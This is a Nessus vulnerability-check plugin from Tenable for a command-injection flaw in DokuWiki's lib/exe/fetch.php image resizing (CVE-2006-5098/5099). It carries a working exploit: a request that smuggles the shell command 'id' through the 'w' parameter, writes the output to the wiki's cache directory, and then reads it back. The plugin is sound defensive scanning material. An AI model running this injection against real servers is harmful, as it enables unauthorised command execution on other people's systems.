#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22475);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-5098", "CVE-2006-5099");
  script_bugtraq_id(20257);
  script_xref(name:"OSVDB", value:"29288");
  script_xref(name:"OSVDB", value:"29289");

  script_name(english:"DokuWiki fetch.php Multiple Variable imconvert Function Arbitrary Command Execution");
  script_summary(english:"Executes arbitrary command via DokuWiki im_convert Feature");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running DokuWiki, an open-source wiki application
written in PHP. 

The installed version of DokuWiki fails to properly sanitize input to
the 'w' and 'h' parameters of the 'lib/exe/fetch.php' script before
using it to execute a command when resizing images.  An
unauthenticated attacker can leverage this issue to execute arbitrary
code on the remote host subject to the privileges of the web server
user id. 

In addition, the application reportedly does not limit the size of
images when resizing them, which can be exploited to churn through CPU
cycles and disk space on the affected host. 

Note that successful exploitation of this issue requires that
DokuWiki's 'imconvert' configuration option be set; by default, it is
not." );
 script_set_attribute(attribute:"see_also", value:"http://bugs.splitbrain.org/?do=details&id=924" );
 script_set_attribute(attribute:"see_also", value:"http://bugs.splitbrain.org/?do=details&id=926" );
 script_set_attribute(attribute:"see_also", value:"http://www.freelists.org/archives/dokuwiki/09-2006/msg00278.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to DokuWiki release 2006-03-09e / 2006-09-28 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2008 Tenable Network Security, Inc.");

  script_dependencies("dokuwiki_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/dokuwiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to run a command.
  cmd = "id";
  fname = string(SCRIPT_NAME, "-", unixtime(), ".html");
  u = string(
      dir, "/lib/exe/fetch.php?",
      "media=wiki:dokuwiki-128.png&",
      "w=1;", cmd, ">../../data/cache/", fname, ";exit;"
    );
  r = http_send_recv3(port:port, method: "GET", item: u);
  if (isnull(r)) exit(0);

  # If it looks like the exploit was successful...
  if (" bad permissions?" >< r[2])
  {
    # Retrieve the output of the command.
    u = string(dir, "/data/cache/", fname);
    r = http_send_recv3(port: port, method: "GET", item: u);
    if (isnull(r)) exit(0);

    # There's a problem if the output looks like it's from id.
    if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string: r[2]))
    {
      if (report_verbosity)
        report = strcat('\nNessus was able to execute the command \'', cmd, 
	'\' on the remote host\n',
	'which produced the following output :\n\n',
          r[2]    );
      else report = NULL;

      security_hole(port:port, extra: report);
      exit(0);
    }
  }
}
